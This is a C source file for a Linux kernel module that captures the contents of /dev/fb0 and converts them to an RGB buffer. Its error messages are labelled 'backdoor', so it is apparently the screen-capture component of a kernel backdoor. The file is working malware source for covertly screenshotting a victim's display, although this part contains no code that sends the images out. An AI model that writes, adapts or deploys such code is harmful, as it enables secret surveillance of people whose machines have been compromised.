#include <linux/string.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/fb.h>

#include "framelogger.h"

/*
    Function that records the frame buffer 0 and stores
    the information at the struct passed as parameter.

    IMPORTANT! Remember to free the rgb_buffer inside
    the fb struct! This is done by calling the
    clean_frame_buffer() after consuming the framebuffer

    @param frame_buffer pointer to struct to be filled
*/
int record_frame_buffer(struct frame_buffer *fb)
{
	struct file *frame_file;

	struct fb_info *info;

	void *framebuffer;
	void *frame_base;

	// We are limiting rgb to 1 byte per color
	// due to specification of P6 PPM image format
	u8 *rgb_buffer;

	long framebuffer_size, rgb_size;
	int i;
	u32 color;
	u32 *pixel;

	// Opens the frame buffer file
	frame_file = filp_open("/dev/fb0", O_RDONLY, 0);
	if (IS_ERR(frame_file)) {
		printk(KERN_ERR "backdoor: Error opening file /dev/fb0\n");
		return -ENOENT;
	}

	// Populates the struct with information about the framebuffer
	info = frame_file->private_data;

	// Extracts usefull information about the buffer
	frame_base = info->screen_base;
	framebuffer_size = info->screen_size;
	fb->yres = info->var.yres;
	fb->xres = info->var.xres;
	// Allocs space to the frame_buffer actual 'frame data'
	framebuffer = vmalloc(framebuffer_size);

	if (!framebuffer) {
		printk(KERN_ERR "backdoor: Failed to allocate memory\n");
		vfree(framebuffer);
		return -ENOMEM;
	}

	// Copies the 'frame data' to the allocated space
	// This step actually 'Screenshots' the screen
	memcpy(framebuffer, frame_base, framebuffer_size);

	// Calculates screen rgb size in bytes (1 byte per color)
	rgb_size = fb->xres * fb->yres * 3;

	// Allocs space to the color buffer (rgb_buffer)
	rgb_buffer = (u8 *)vmalloc(sizeof(u8) * rgb_size);

	if (!rgb_buffer) {
		printk(KERN_ERR "backdoor: Failed to allocate memory\n");
		vfree(framebuffer);
		return -ENOMEM;
	}

	// Casts the framebuffer as 32 byte
	pixel = (u32 *)framebuffer;
	i = 0;
	while (i < rgb_size) {
		/*
		 * Heres a brief explanation about how does the framebuffer data is structured.
		 * Each pixel contains 'info->var.bits_per_pixel' bits of information (and trust
		 * me it usually is 32 bits for personal computers), being distributed (usually
		 * equally) across 'red', 'green', 'blue' and 'transp' informations.
		 *
		 * Each information is actually a 'struct fb_bitfield' having each some attributes
		 * as 'length' and 'offset' (more details you can find at kernel documentation).
		 * 
		 * So the color information are stored at red, green and blue "chunks". To access
		 * it is recomended by the own kernel documentation to use the 'shift operators'
		 * to shift the whole "color chunk" pick the color you want, that has its own size
		 * indicated on the 'struct fb_bitfield'.size
		 * */

		color = *pixel++;

		rgb_buffer[i++] = (color >> info->var.red.offset) &
				  ((1 << info->var.red.length) - 1); // RED
		rgb_buffer[i++] = (color >> info->var.green.offset) &
				  ((1 << info->var.green.length) - 1); // GREEN
		rgb_buffer[i++] = (color >> info->var.blue.offset) &
				  ((1 << info->var.blue.length) - 1); // BLUE
	}

	// Closes the frame buffer device file
	filp_close(frame_file, NULL);

	// Links the actual rgb buffer to the rgb_buffer inside the struct
	fb->rgb_buffer = rgb_buffer;

	// Frees the allocated memory for the buffer
	vfree(framebuffer);

	return 0;
}

/*
    Function that cleans the framebuffer by freeing the
    rgb_buffer allocated by record_frame_buffer()
 */
void clean_frame_buffer(struct frame_buffer *fb)
{
	vfree(fb->rgb_buffer);
}
